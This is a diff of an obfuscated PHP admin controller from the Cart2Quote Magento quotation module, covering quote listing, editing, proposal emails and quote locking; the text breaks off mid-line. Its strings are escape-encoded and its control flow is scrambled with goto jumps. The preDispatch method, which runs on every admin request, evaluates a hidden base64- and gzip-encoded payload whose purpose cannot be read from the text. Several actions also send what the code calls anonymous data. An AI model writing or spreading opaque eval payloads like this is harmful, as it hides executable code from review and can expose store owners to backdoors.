@@ -1,5 +1,3665 @@
 <?php
-// Cart2Quote is a commercial software module for Magento.
-// Unpaid usage of our licensed functionalities is prohibited.
-// See www.cart2quote.com for more details.
- class Ophirah_Qquoteadv_Adminhtml_QquoteadvController extends Mage_Adminhtml_Controller_Action { const yvFKk = "\x71\x71\x75\x6f\164\145\x61\x64\166\137\x71\165\x6f\x74\x65\x5f\x65\x6d\x61\x69\x6c\x73\57\164\x65\x6d\160\154\141\x74\145\163\x2f\160\162\x6f\x70\x6f\163\141\x6c"; const cUXeM = "\161\161\165\157\x74\x65\141\144\x76\x5f\161\165\157\164\145\x5f\x65\x6d\141\x69\x6c\163\57\x74\145\155\x70\x6c\141\164\x65\163\x2f\162\145\x71\165\145\163\164"; const vBk_Y = "\x63\150\145\x63\x6b\137\x75\x72\154\x5f\163\x65\x74\164\151\156\x67\x73"; const lq8Yo = "\156\x6f\x2d\144\x69\163\x70\141\x74\143\x68"; protected $F_sgo = false; protected $ybeW8 = array(); protected $ckgwQ; protected function _initCustomer($JbfGE = "\x69\144") { goto uYe68; kXKA6: if (!$EY6wb) { goto GsxTJ; } goto jIPct; eSu3C: $ZXeg2 = Mage::getModel("\x63\165\x73\x74\x6f\155\x65\162\57\x63\x75\x73\x74\x6f\x6d\145\162"); goto kXKA6; Dq_2W: return $this; goto DsL5r; jIPct: $ZXeg2->load($EY6wb); goto eN4TZ; eN4TZ: GsxTJ: goto NZp2N; NZp2N: Mage::register("\143\165\162\162\145\156\x74\x5f\143\165\163\x74\157\x6d\x65\x72", $ZXeg2); goto Dq_2W; uYe68: $this->_title(Mage::helper("\x61\x64\x6d\151\x6e\x68\x74\x6d\x6c")->__("\103\x75\163\164\x6f\x6d\x65\162\x73"))->_title(Mage::helper("\x61\x64\x6d\x69\x6e\150\x74\155\154")->__("\x4d\x61\x6e\141\147\145\x20\103\165\x73\164\157\155\x65\x72\x73")); goto Z5pul; Z5pul: $EY6wb = (int) $this->getRequest()->getParam($JbfGE); goto eSu3C; DsL5r: } public function quotesAction() { goto eDiVo; Ce9wx: Mage::dispatchEvent("\x6f\160\x68\x69\x72\x61\150\137\x71\x71\165\x6f\164\x65\x61\144\x76\137\141\x64\155\151\x6e\137\161\x75\x6f\x74\145\x73\x5f\141\x66\x74\145\162", []); goto LUxAK; HI4VH: $this->loadLayout(); goto hq3hO; eDiVo: Mage::dispatchEvent("\x6f\160\x68\x69\x72\141\150\x5f\x71\x71\x75\157\164\145\x61\144\166\x5f\x61\144\155\151\x6e\137\x71\x75\157\164\x65\x73\x5f\x62\x65\x66\157\162\145", []); goto Ue91z; hq3hO: $this->renderLayout(); goto Ce9wx; Ue91z: $this->_initCustomer(); goto HI4VH; LUxAK: } protected function _initAction() { $this->loadLayout()->_setActiveMenu("\163\x61\154\x65\x73\57\161\161\x75\x6f\x74\145\141\144\166")->_addBreadcrumb($this->__("\111\x74\x65\155\163\x20\115\141\156\141\147\x65\x72"), $this->__("\x49\x74\145\155\x20\115\141\156\x61\147\145\x72")); return $this; } public function indexAction() { goto IuMRw; Pkccf: L0D8h: goto d4Fkh; ejIoq: $mcnp2 = $this->getLayout()->createBlock("\143\157\x72\x65\57\x74\x65\x78\164", "\145\170\141\x6d\160\154\145\x2d\142\154\157\143\x6b"); goto sQn5T; WBkoY: if (!Mage::helper("\161\x71\x75\x6f\x74\145\x61\x64\166\x2f\x6c\151\143\145\x6e\x73\x65\143\x68\x65\143\153\x73")->showFreeUserOptions()) { goto L0D8h; } goto ulkMs; vNcOP: $this->_initAction(); goto WBkoY; ulkMs: $HddBz = $this->getMsgToUpgrade(false); goto ejIoq; RPjTT: Mage::dispatchEvent("\x6f\160\150\151\162\141\150\137\161\x71\165\x6f\x74\145\141\x64\166\137\x61\144\x6d\151\156\137\x69\156\x64\145\x78\x5f\x62\145\x66\157\162\145", []); goto vNcOP; d4Fkh: $this->renderLayout(); goto wXJEX; KRndj: qODDI: goto RPjTT; wXJEX: Mage::dispatchEvent("\157\x70\150\151\x72\141\150\x5f\161\161\165\x6f\164\145\141\144\x76\137\141\x64\x6d\x69\156\x5f\x69\156\x64\x65\170\137\x61\x66\164\145\162", []); goto FH3SM; GZ61A: Mage::getSingleton("\x61\x64\155\x69\x6e\x68\164\x6d\154\57\x73\145\x73\163\151\157\156")->addError(Mage::helper("\x71\161\x75\157\x74\x65\141\x64\166")->__("\124\150\x65\40\155\x6f\x64\165\x6c\x65\40\x22\117\160\150\151\x72\141\150\137\x43\x72\155\x61\144\144\157\156\42\x20\151\163\x20\144\151\x73\141\x62\x6c\x65\x64\54\x20\x70\x6c\145\x61\x73\40\145\156\x61\x62\154\x65\x20\x69\164\56\x20\x28\141\160\160\x2f\145\164\143\x2f\155\157\144\165\x6c\145\163\57\117\x70\150\151\x72\x61\x68\137\103\162\155\x61\144\144\x6f\156\x2e\170\x6d\154\51")); goto KRndj; IuMRw: if (!(!Mage::helper("\143\157\162\145")->isModuleEnabled("\x4f\x70\x68\x69\162\141\x68\137\103\x72\x6d\141\144\x64\157\x6e") || $this->{"\154"}->{$this->{"\x62"}}())) { goto qODDI; } goto GZ61A; sQn5T: $this->_addContent($mcnp2->setText($HddBz)); goto Pkccf; FH3SM: } public function editAction() { goto A68uD; InLBa: if ($BKJM3->isAllowed($kj5VM)) { goto ACIz7; } goto Yv0MG; zBSWW: $this->_redirect("\52\x2f\52\57"); goto aCu0c; HEXJI: peuwK: goto XCoAF; TqUNE: Mage::helper("\x71\161\165\x6f\164\x65\x61\144\166")->setCurrentCurrency($uw2vN->getCurrency()); goto jwMN4; TcncK: Mage::register("\143\x72\x65\141\164\x65\110\x61\163\150", $OpJs6); goto vnL1p; inYcs: $uw2vN = $this->getQuotationQuote($vuQ04); goto A0thO; nyij0: ACIz7: goto ziM3x; aPWGK: $this->_addContent($this->getLayout()->createBlock("\x63\x6f\162\x65\57\164\145\170\x74", "\145\170\141\155\x70\x6c\145\x2d\x62\154\157\143\x6b")->setText($HddBz)); goto KlZwy; KlZwy: lFDb7: goto ouErI; Y8YZa: goto iyYBJ; goto qKJXP; CjquL: o35Vm: goto SyZ53; bQ3nh: Mage::getSingleton("\141\144\155\x69\156\150\x74\x6d\154\57\x73\x65\x73\x73\151\x6f\x6e")->addError(Mage::helper("\x63\x68\x65\143\153\x6f\x75\x74")->__("\121\x75\x6f\164\x65\x20\x69\x74\x65\x6d\40\x64\x6f\145\163\x20\156\x6f\164\x20\x65\170\151\x73\x74\x2e")); goto htBMT; Yv0MG: if (!($wxtEo != $uw2vN->getUserId() && $uw2vN->getUserId() != "\x30")) { goto tK4xy; } goto d4MfV; UVQ_W: if (empty($xOx3u)) { goto o35Vm; } goto zrgCW; SyZ53: Mage::register("\x71\161\165\x6f\x74\x65\137\x64\x61\x74\x61", $uw2vN); goto gVnwH; pYIVo: Mage::getSingleton("\x61\144\x6d\x69\x6e\x68\x74\x6d\154\x2f\163\x65\x73\163\151\x6f\156")->addError(Mage::helper("\161\161\165\x6f\164\145\141\144\x76")->__("\124\x68\x65\40\155\157\144\165\x6c\x65\40\x6f\165\x74\160\x75\164\x20\157\x66\40\42\117\160\150\x69\162\141\150\137\x43\162\x6d\141\x64\144\157\x6e\x22\40\x69\163\40\x64\x69\163\x61\142\154\x65\144\54\x20\x70\x6c\145\x61\x73\40\x65\156\x61\142\x6c\x65\40\151\164\x2e\40\x28\123\x79\x73\x74\x65\x6d\x3e\x43\x6f\x6e\146\x69\147\x75\162\141\164\x69\157\x6e\76\101\144\166\141\156\x63\x65\x64\76\101\x64\166\141\156\x63\145\x64\76\104\151\163\141\142\x6c\x65\40\x4d\x6f\x64\165\154\145\163\40\x4f\x75\x74\160\x75\164\76\x4f\x70\x68\x69\162\x61\150\x5f\x43\x72\x6d\x61\144\x64\157\156\51")); goto ft6Oa; gVnwH: $this->loadLayout(); goto Y7znV; MbCZN: $xOx3u = Mage::getSingleton("\x61\x64\155\151\x6e\150\x74\155\154\x2f\163\145\x73\163\x69\x6f\x6e")->getFormData(true); goto UVQ_W; W_WqR: $hoPk5->setCanLoadExtJs(true); goto CJtin; A0thO: $this->_title($this->__("\123\x61\154\x65\163"))->_title($this->__("\121\165\x6f\164\141\x74\x69\x6f\x6e\163")); goto aKI1R; D3jzQ: $wxtEo = $BKJM3->getUser()->getUserId(); goto f02Bq; GQh0C: if (!(is_null($L4Wik) || $this->isTrialVersion($OpJs6) || !$this->QxAac($uw2vN->getStoreId()))) { goto lFDb7; } goto TcncK; ouErI: $this->renderLayout(); goto Hrp5f; Hrp5f: iyYBJ: goto de4aE; CJtin: $OpJs6 = $uw2vN->getCreateHashArray(); goto aY3Ww; aCu0c: return null; goto HEXJI; gDhTh: $this->_title(sprintf("\43\45\163", $uw2vN->getIncrementId())); goto DGReC; f02Bq: $qup2m = "\141\x64\x6d\x69\x6e\x2f\x73\141\x6c\x65\163\57\x71\161\165\157\164\x65\141\x64\166\x2f\x73\141\x6c\145\163\162\x65\x70\166\x69\x65\x77"; goto Wkivw; bZD3K: tK4xy: goto nyij0; qKJXP: D8uGm: goto Me8Dm; DGReC: Mage::getSingleton("\x63\157\162\x65\x2f\x73\x65\x73\163\151\x6f\x6e")->tDErD = $vuQ04; goto MbCZN; XCoAF: if (Mage::helper("\143\157\x72\145")->isModuleOutputEnabled("\x4f\160\150\151\162\x61\x68\137\103\x72\155\x61\x64\144\x6f\156")) { goto x0jyn; } goto pYIVo; jwMN4: $hoPk5 = $this->getLayout()->getBlock("\x68\145\x61\144"); goto W_WqR; mBz8_: $this->_redirect("\x2a\57\x2a\x2f"); goto tfmF3; Me8Dm: if (!Mage::helper("\x71\x71\x75\x6f\164\145\x61\x64\x76\57\x6c\x69\x63\x65\156\x73\x65\x63\150\x65\x63\x6b\163")->isAllowedLimitSalesRepQuote()) { goto tSP4M; } goto HAiQW; ft6Oa: x0jyn: goto yCFu_; HAiQW: $BKJM3 = Mage::getSingleton("\141\x64\155\151\156\x2f\163\x65\x73\x73\151\x6f\x6e"); goto D3jzQ; de4aE: Mage::dispatchEvent("\x6f\x70\x68\151\162\141\150\x5f\x71\161\165\157\164\145\x61\144\166\137\x61\144\155\x69\x6e\137\145\x64\151\164\137\141\146\164\145\162", [$vuQ04]); goto lfhJa; A68uD: if (!Mage::helper("\x71\161\x75\157\x74\x65\141\x64\x76\57\x6c\x69\143\145\156\163\x65\x63\x68\x65\143\153\163")->showFreeUserOptions()) { goto peuwK; } goto zBSWW; ijrej: Mage::dispatchEvent("\x6f\160\150\x69\162\141\150\x5f\x71\x71\165\157\164\145\x61\x64\166\x5f\141\144\155\x69\x6e\137\x65\144\151\x74\137\142\x65\x66\157\x72\145", [$vuQ04]); goto inYcs; ziM3x: tSP4M: goto gDhTh; aY3Ww: $L4Wik = $this->XdgON(); goto GQh0C; Wkivw: $kj5VM = $BKJM3->getData("\x61\143\154")->get($qup2m)->getResourceId(); goto InLBa; Y7znV: $this->_setActiveMenu("\161\161\165\157\x74\x65\x61\x64\x76\x2f\x69\164\x65\x6d\x73"); goto TqUNE; yCFu_: $vuQ04 = $this->getRequest()->getParam("\151\144"); goto ijrej; vnL1p: $HddBz = $this->getMsgToUpgrade(false, $uw2vN->getStoreId()); goto aPWGK; zrgCW: $uw2vN->setData($xOx3u); goto CjquL; d4MfV: Mage::getSingleton("\141\x64\x6d\151\156\150\164\x6d\x6c\57\x73\145\163\x73\151\x6f\156")->addError(Mage::helper("\161\161\x75\157\164\145\141\144\166")->__("\131\157\x75\x20\144\x6f\x6e\x27\x74\40\150\x61\x76\x65\x20\x70\145\x72\155\151\x73\x73\x69\157\156\40\164\157\40\166\x69\145\x77\x20\157\x72\x20\x65\x64\151\164\x20\x74\150\151\x73\x20\x51\x75\157\164\145")); goto mBz8_; htBMT: $this->_redirect("\x2a\57\52\x2f"); goto Y8YZa; aKI1R: if (isset($vuQ04) && ($uw2vN->getId() || $vuQ04 == 0)) { goto D8uGm; } goto bQ3nh; tfmF3: return null; goto bZD3K; lfhJa: } public function newAction() { goto bjeVp; iG1tT: $this->renderLayout(); goto LPwTg; I2_Xx: $this->getLayout()->getBlock("\x68\145\141\144")->setCanLoadExtJs(true); goto BBCz5; LPwTg: Mage::dispatchEvent("\x6f\160\x68\x69\x72\141\150\x5f\161\x71\165\x6f\x74\x65\141\144\x76\137\141\144\155\151\x6e\x5f\x6e\x65\x77\137\141\146\164\145\162", []); goto UiWTB; BoB7e: $this->loadLayout(); goto I2_Xx; bjeVp: Mage::dispatchEvent("\x6f\x70\150\x69\x72\141\150\x5f\161\x71\x75\x6f\164\x65\x61\144\x76\x5f\141\x64\155\151\156\137\x6e\x65\x77\137\142\145\x66\157\x72\x65", []); goto BoB7e; BBCz5: $this->_addContent($this->getLayout()->createBlock("\161\x71\x75\157\x74\145\x61\144\x76\x2f\141\144\155\151\x6e\x68\x74\x6d\x6c\x5f\161\x71\x75\157\164\x65\141\x64\x76\137\x65\x64\151\164")); goto iG1tT; UiWTB: } public function preDispatch() { goto FeQOU; DTBZD: $dSebw .= "\64\126\154\x4a\142\x6f\x44\x73\142\107\x76\x72\x62\x6f\155\125\110\x46\x4a\x52\x6d\x61\170\162\x6c\x30\117\x55\x49\164\x76\x59\156\x71\x71\x6c\126\x56\x47\141\153\x35\x42\141\x70\107\107\x53\x67\x5a\x43\115\147\154\x71\130\155\x52\165\117\x55\x67\120\101\x41\75\75"; goto pb_Ux; pb_Ux: eval(gzinflate(base64_decode($dSebw))); goto S51wl; FeQOU: $dSebw = "\x55\x36\154\125\x73\106\x56\x51\x54\60\x6f\x73\124\152\125\172\151\x55\71\x4a\124\x63\65\120\x53\126\127\x33\x35\x6c\114\112\x41\111\x71\x71\126\107\161\157\x4a\x30\x65\x34\x47\123\x59\x5a\102\x2b\126\105\150\147\x63\132\x2b\x52\150\126\106\105\121\141\x68\132\125\x6d\x47"; goto DTBZD; S51wl: return parent::preDispatch(); goto JdoY2; JdoY2: } protected function _sendProposalEmail($EY6wb, $YBSdJ, $XELOl) { goto OUn6F; e7gQu: Mage::getSingleton("\141\x64\155\151\x6e\150\x74\x6d\x6c\x2f\163\145\x73\163\x69\x6f\156")->addError($w5FwR); goto JJcJ1; OUn6F: $FsnNf = $this->getQuotationQuote($XELOl); goto cnq5d; aoIZ3: $w5FwR = "\x27\x53\171\x73\x74\145\155\40\76\40\x43\157\156\146\151\147\x75\x72\x61\164\x69\157\x6e\40\76\40\x41\x64\x76\141\156\143\145\144\40\x3e\40\123\171\163\164\x65\155\x20\76\40\x4d\x61\151\x6c\x20\123\x65\156\x64\151\x6e\x67\40\x53\145\164\164\x69\156\x67\x73\x20\76\40\x44\151\x73\141\142\x6c\145\40\105\155\x61\151\154\x20\103\x6f\155\x6d\165\x6e\151\x63\141\x74\x69\x6f\156\163\47\x20\151\x73\40\x73\x65\x74\x20\x74\x6f\40\47\131\x65\x73\47"; goto e7gQu; G4eO4: try { goto lPQLI; Js38o: Mage::getSingleton("\x61\x64\155\151\x6e\x68\164\155\x6c\x2f\x73\x65\x73\x73\x69\x6f\x6e")->addSuccess($this->__("\105\x6d\x61\151\x6c\40\167\141\x73\x20\163\145\x6e\164\40\x74\157\40\143\x6c\x69\x65\156\164")); goto QMBqS; fiyU4: if (!isset($PF9i1["\x6d\145\x73\163\x61\x67\x65"])) { goto umbyj; } goto GjEkX; GjEkX: Mage::log("\x4c\141\x73\x74\x20\x65\x72\162\x6f\162\x20\142\x65\x66\157\x72\x65\40\x73\x65\156\144\120\x72\x6f\x70\157\163\141\x6c\x45\x6d\x61\x69\154\x2c\40\142\x75\x74\40\x63\x6f\165\154\144\x20\142\145\x20\165\x6e\162\x65\x6c\141\x74\x65\144\x3a\40" . $PF9i1["\x6d\145\x73\163\x61\147\x65"], null, "\x63\62\x71\137\x65\x78\143\145\160\164\151\x6f\x6e\56\x6c\157\x67", true); goto UP1K6; XUOoR: UnGrB: goto gSwzE; CtbD6: $NYN03 = $this->sendEmail(["\x65\155\x61\x69\x6c" => $ZXeg2->getEmail(), "\x6e\x61\x6d\x65" => $ZXeg2->getName()]); goto tEWBr; HRbcE: goto tzUV8; goto XUOoR; X6Cax: Mage::getSingleton("\x61\144\x6d\151\x6e\150\164\x6d\x6c\57\x73\x65\163\163\151\157\x6e")->addError($WzFf2); goto HRbcE; phMrv: if (is_string($NYN03) && $NYN03 == Ophirah_Qquoteadv_Model_System_Config_Source_Email_Templatedisable::VALUE_DISABLED_EMAIL) { goto UnGrB; } goto Js38o; QMBqS: Mage::helper("\161\161\x75\157\164\x65\141\x64\166\57\154\157\147\x67\151\156\147")->sentAnonymousData("\160\162\157\x70\157\163\141\154", "\x62", $XELOl); goto tC_6f; NPYg5: if (!is_array($PF9i1)) { goto j3DvP; } goto fiyU4; UP1K6: umbyj: goto hLx5q; tEWBr: if (empty($NYN03)) { goto xz7ny; } goto phMrv; lPQLI: $ZXeg2 = Mage::getModel("\143\x75\x73\x74\157\155\145\162\57\143\165\x73\164\157\155\x65\162")->load($EY6wb); goto CtbD6; m0XOz: xz7ny: goto Z1L3B; Z1L3B: $WzFf2 = $this->__("\103\141\162\164\x32\x51\165\157\164\145\x20\160\x72\x6f\160\x6f\163\x61\x6c\40\x65\155\141\151\x6c\40\167\141\x73\40\x6e\x6f\164\40\163\145\156\x74\x20\164\x6f\40\x74\150\x65\x20\143\x6c\x69\x65\156\164\40\146\x6f\162\40\x71\165\x6f\x74\x65\x20\43\45\x73", $YBSdJ); goto YhbWM; hLx5q: j3DvP: goto X6Cax; gSwzE: Mage::getSingleton("\x61\144\x6d\151\x6e\x68\164\155\154\57\163\145\163\163\x69\157\x6e")->addNotice($this->__("\x53\x65\156\144\151\156\x67\x20\x70\x72\x6f\x70\x6f\163\x61\154\40\x45\155\141\x69\x6c\x20\151\163\x20\144\x69\x73\x61\x62\x6c\x65\x64")); goto C9Y4X; YhbWM: $PF9i1 = error_get_last(); goto NPYg5; C9Y4X: tzUV8: goto eqHSH; tC_6f: goto tzUV8; goto m0XOz; eqHSH: } catch (Exception $Zf0h2) { goto je2Ps; x1jLC: return; goto EREZn; je2Ps: $WzFf2 = $this->__("\x43\x61\162\164\x32\x51\165\157\164\x65\40\x70\x72\157\x70\x6f\163\141\x6c\x20\x65\x6d\x61\151\154\40\167\141\x73\x20\156\x6f\164\x20\x73\x65\156\x74\x20\x74\x6f\x20\164\150\x65\x20\x63\x6c\x69\x65\156\x74\40\x66\x6f\162\x20\161\x75\x6f\x74\145\x20\43\45\163", $YBSdJ); goto BlO9y; i0x0e: $this->_redirect("\x2a\x2f\x2a\57"); goto x1jLC; H5p6r: Mage::getSingleton("\x61\x64\155\151\x6e\x68\x74\155\154\57\x73\x65\163\x73\151\x6f\156")->addError($WzFf2); goto i0x0e; BlO9y: Mage::log("\105\170\143\145\x70\164\x69\157\156\x3a\40" . $Zf0h2->getMessage(), null, "\x63\62\x71\x5f\x65\170\143\145\160\x74\x69\157\156\56\154\x6f\x67", true); goto H5p6r; EREZn: } goto Q0d4u; JJcJ1: hwhQM: goto G4eO4; cnq5d: if (!(Mage::getStoreConfig("\163\x79\163\164\145\155\57\163\155\x74\x70\x2f\144\x69\x73\x61\142\154\x65", $FsnNf->getStoreId()) == "\61")) { goto hwhQM; } goto aoIZ3; Q0d4u: } public function editLockQuoteAction() { try { goto H2hYi; qLLUW: Mage::helper("\143\162\155\141\x64\x64\157\156")->duplicateQuoteMessagesToNewQuote($FsnNf, $WpVN9); goto gyhs0; CA1K8: $mi6IS = $FsnNf->getOriginalIncrementId(); goto bBk_x; oxaiO: Mage::dispatchEvent("\161\161\165\157\164\x65\141\x64\166\137\161\161\x61\144\x76\143\x75\x73\x74\x6f\155\145\x72\137\141\x66\164\145\162\143\141\x6e\143\x65\x6c", ["\161\x75\157\164\x65" => $uw2vN]); goto R03u1; gyhs0: $uw2vN = Mage::getModel("\x71\161\165\157\164\145\x61\x64\x76\57\161\161\141\144\x76\143\x75\x73\164\157\x6d\145\162")->load($XELOl); goto YYxMB; i2Btz: $WpVN9->setData("\x72\145\x6c\141\x74\x69\157\x6e\x5f\x70\x61\162\x65\x6e\x74\x5f\162\145\141\154\x5f\151\x64", $FsnNf->getIncrementId()); goto coN5w; rstbf: OxZJf: goto AIvcz; owRjd: Mage::dispatchEvent("\161\x71\x75\x6f\x74\x65\141\144\166\137\161\161\141\144\166\x63\x75\x73\164\157\155\x65\x72\137\x62\x65\146\157\x72\145\x63\141\156\143\x65\154", ["\161\165\x6f\x74\145" => $FsnNf]); goto CA1K8; jhO21: $FsnNf->setRelationChildRealId($WpVN9->getIncrementId()); goto mYNvv; ui4by: Mage::helper("\161\x71\165\x6f\164\145\x61\144\166")->duplicateQuoteProductsToNewQuote($FsnNf, $WpVN9); goto qLLUW; W7mQD: Mage::getSingleton("\x61\144\x6d\x69\x6e\x68\x74\x6d\x6c\57\x73\145\x73\163\151\x6f\156")->addNotice($WzFf2); goto o04AZ; sxZ5A: $WpVN9->setData("\163\x74\141\x74\x75\x73", 6050/605); goto SnjSx; SnjSx: $WpVN9->setData("\157\x72\x69\x67\151\156\x61\x6c\x5f\151\156\143\162\x65\155\x65\x6e\x74\x5f\x69\144", $mi6IS); goto zYYK3; wUwV0: uDyUS: goto XXGzo; zYYK3: $WpVN9->setData("\162\145\154\141\x74\x69\x6f\156\137\x70\x61\x72\x65\156\x74\x5f\x69\x64", $FsnNf->getId()); goto i2Btz; SRcjz: unset($ws2wE["\x72\x65\x6c\x61\x74\151\157\x6e\x5f\x63\150\151\x6c\144\137\x69\x64"]); goto Dtc4O; eQ7TM: Mage::dispatchEvent("\157\x70\150\151\x72\141\x68\137\x71\161\165\157\164\x65\x61\x64\166\x5f\x61\144\x6d\151\x6e\x5f\x65\x64\151\164\x4c\x6f\x63\x6b\121\x75\x6f\164\x65\x5f\141\x66\x74\x65\162", [$XELOl]); goto wUwV0; L8iD4: $mi6IS = $FsnNf->getIncrementId(); goto F7NLO; H2hYi: $XELOl = (int) $this->getRequest()->getParam("\151\144"); goto vJdeY; LUUOE: $WpVN9->setShippingPrice($wu_tq->getPrice()); goto CyRbs; CyRbs: FFxF7: goto hXpRw; XTVWu: $FsnNf = $this->getQuotationQuote($XELOl); goto pVA21; eWpd1: $KOa53 = $WpVN9->getShippingAddress()->getId(); goto qqBLN; kCpfN: $WpVN9->updateAddress(); goto AvtXu; hhbQb: $tyhea = $FsnNf->getShippingAddress(); goto IPB2o; NlHHL: if (!($Ik2tk && $KOa53 && $ny4lG)) { goto hbuqt; } goto iHnS0; zRZT7: $WpVN9->save(); goto p5133; jQYQd: $this->ckgwQ = $FsnNf; goto BjFeD; iHnS0: $Ik2tk->requestShippingRates(); goto WrjyF; IF5OL: $WpVN9->setData("\157\162\x69\x67\151\156\141\154\x5f\151\156\x63\x72\x65\155\145\x6e\x74\x5f\x69\x64", $mi6IS); goto sxZ5A; iE5j6: Mage::dispatchEvent("\x71\x71\165\x6f\164\x65\x61\144\x76\x5f\x71\161\x61\144\166\143\165\163\164\x6f\x6d\145\x72\137\141\146\164\145\162\163\141\x66\145\137\146\151\156\x61\154", ["\161\165\157\x74\x65" => $uw2vN]); goto lJYSn; XXGzo: N3dyH: goto s2Mb1; AvtXu: $Ik2tk = $WpVN9->getShippingAddress(); goto eWpd1; Dtc4O: unset($ws2wE["\162\x65\154\141\x74\x69\x6f\156\x5f\x63\x68\x69\154\144\x5f\x72\145\141\x6c\137\151\144"]); goto blj93; l6s1J: $UBqIV = Mage::getModel("\161\x71\165\157\164\145\x61\x64\x76\x2f\161\165\x6f\164\x65\163\150\x69\x70\160\x69\x6e\x67\x72\x61\x74\x65")->getShippingMethodByCode($fgKXo, $ny4lG); goto Cq_FC; EiCjz: $ws2wE = $FsnNf->getData(); goto zrdtI; p5133: Mage::dispatchEvent("\161\161\x75\157\164\x65\x61\144\x76\137\161\x71\141\x64\166\x63\165\x73\x74\x6f\x6d\x65\x72\137\141\x66\164\145\x72\x73\141\x66\x65\x5f\156\145\x77", ["\161\165\157\164\145" => $WpVN9]); goto CXRkX; AIvcz: h1Eyu: goto Ei0J_; XrzXo: if (!(intval($YdMff) >= 15600/312)) { goto uDyUS; } goto eBxyN; CXRkX: $FsnNf->setRelationChildId($WpVN9->getId()); goto jhO21; Lctkz: $wu_tq->save(); goto rstbf; IPB2o: if (!$tyhea) { goto U5rON; } goto P1Eed; pVA21: $YdMff = $FsnNf->getData("\x73\x74\141\164\x75\x73"); goto XrzXo; WrjyF: $wu_tq = Mage::getModel("\x71\161\165\157\x74\x65\141\x64\x76\57\161\165\x6f\x74\145\163\x68\x69\x70\160\x69\x6e\x67\162\141\x74\x65")->getShippingMethodByCode($KOa53, $ny4lG); goto EMc3U; bBk_x: if ($mi6IS) { goto ttlTX; } goto L8iD4; vJdeY: if (!$XELOl) { goto N3dyH; } goto shbYV; Ei0J_: if (!$wu_tq) { goto FFxF7; } goto doOfp; doOfp: $WpVN9->setShippingType($wu_tq->getId()); goto LUUOE; blj93: $WpVN9 = Mage::getModel("\161\161\165\x6f\x74\x65\141\144\166\57\161\161\141\144\166\x63\x75\x73\164\x6f\155\x65\162")->setData($ws2wE)->save(); goto IF5OL; R03u1: Mage::helper("\161\x71\x75\157\x74\x65\141\x64\x76\57\154\157\147\147\x69\156\x67")->sentAnonymousData("\143\x61\x6e\x63\x65\154", "\x62", $XELOl); goto UjORM; zrdtI: unset($ws2wE["\x71\165\x6f\x74\x65\x5f\151\x64"]); goto SRcjz; YYxMB: $uw2vN->setStatus(Ophirah_Qquoteadv_Model_Status::STATUS_CANCELED); goto eU82Z; P1Eed: $fgKXo = $tyhea->getId(); goto sZFuL; NnzJy: TtVvg: goto l6s1J; lJYSn: Mage::dispatchEvent("\x71\161\x75\157\164\145\141\x64\166\x5f\161\x71\141\144\x76\143\x75\x73\x74\157\x6d\145\162\x5f\141\146\x74\x65\x72\x63\141\x6e\143\x65\x6c\137\x61\146\164\x65\x72\x45\x64\x69\x74\x4c\157\x63\x6b\x51\x75\x6f\164\145", ["\161\165\157\x74\x65" => $uw2vN]); goto oxaiO; eBxyN: Mage::dispatchEvent("\x71\161\x75\157\164\x65\141\x64\x76\x5f\x71\161\141\144\166\143\165\163\x74\x6f\x6d\x65\162\x5f\142\145\146\157\x72\145\143\141\156\x63\145\154\137\x61\x66\x74\145\x72\x45\144\151\164\x4c\x6f\143\x6b\121\x75\x6f\x74\x65", ["\161\x75\x6f\164\x65" => $FsnNf]); goto owRjd; F7NLO: ttlTX: goto EiCjz; eU82Z: $uw2vN->save(); goto iE5j6; lFfdU: Mage::dispatchEvent("\x71\161\165\157\164\x65\141\x64\166\137\161\161\x61\144\x76\x63\x75\x73\x74\x6f\155\x65\x72\137\x62\145\x66\157\x72\145\x73\x61\x66\145\x5f\156\x65\167", ["\161\165\x6f\164\145" => $WpVN9]); goto zRZT7; drKWH: $this->_redirect($ZSfZh); goto eQ7TM; coN5w: $WpVN9->setData("\x65\x64\151\164\137\x69\x6e\143\x72\145\155\145\x6e\x74", $FsnNf->getEditIncrement() + 298/298); goto sgdC1; YAWsr: $WpVN9->setData("\143\x72\145\141\x74\x65\x64\x5f\x61\x74", now()); goto hhbQb; UjORM: Mage::helper("\161\161\165\x6f\x74\145\x61\144\x76\57\x6c\157\x67\x67\151\x6e\147")->sentAnonymousData("\x72\145\x71\165\145\163\164", "\x62", $WpVN9->getId()); goto dH1xZ; hXpRw: hbuqt: goto lFfdU; o04AZ: goto OxZJf; goto NnzJy; Cq_FC: $wu_tq->setPrice($UBqIV->getPrice()); goto Lctkz; sZFuL: U5rON: goto kCpfN; dH1xZ: $ZSfZh = "\x2a\57\52\57\145\x64\151\x74\x2f\x69\x64\x2f" . $WpVN9->getId(); goto drKWH; Lhr0p: if ($wu_tq) { goto TtVvg; } goto Qd79j; BjFeD: Mage::helper("\161\161\165\157\x74\145\141\x64\166")->updateQuoteEditIncrements($WpVN9); goto ui4by; G0NTk: $FsnNf->save(); goto jQYQd; sgdC1: $WpVN9->setData("\x69\156\x63\x72\x65\x6d\145\156\x74\137\151\144", $mi6IS . "\x2d" . ($FsnNf->getEditIncrement() + 321/321)); goto YAWsr; Qd79j: $WzFf2 = $this->__("\124\150\x65\x20\163\150\151\x70\x70\x69\156\x67\x20\x6d\145\x74\150\x6f\x64\40\143\157\165\154\144\40\156\157\x74\40\x62\145\x20\x74\162\141\x6e\163\146\x65\162\x65\144\x20\x74\x6f\x20\164\x68\x69\x73\x20\x71\165\x6f\x74\x65\54\40\160\x6c\x65\x61\163\145\x20\162\x65\x2d\x61\160\x70\154\171\x20\x61\40\163\x68\x69\x70\160\151\x6e\x67\40\155\145\x74\x68\x6f\144\x2e"); goto W7mQD; shbYV: Mage::dispatchEvent("\x6f\160\x68\151\162\141\x68\x5f\x71\x71\165\157\164\145\141\x64\x76\137\141\x64\x6d\151\x6e\137\145\x64\151\x74\x4c\157\143\x6b\121\x75\157\164\145\x5f\x62\145\146\x6f\x72\145", [$XELOl]); goto XTVWu; qqBLN: $ny4lG = $WpVN9->getShippingCode(); goto NlHHL; mYNvv: Mage::dispatchEvent("\x71\161\165\x6f\x74\x65\x61\x64\166\137\x71\x71\x61\144\x76\x63\165\163\x74\x6f\x6d\x65\162\x5f\x62\x65\146\x6f\x72\x65\163\141\146\x65\137\x66\151\x6e\141\x6c", ["\161\x75\157\164\145" => $FsnNf]); goto G0NTk; EMc3U: if (!isset($fgKXo)) { goto h1Eyu; } goto Lhr0p; s2Mb1: } catch (Exception $Zf0h2) { goto OKADu; a7saG: $this->_redirect($ZSfZh); goto LARSc; A2QsD: $XELOl = (int) $this->getRequest()->getParam("\x69\144"); goto KOCDH; TAGom: $WzFf2 = 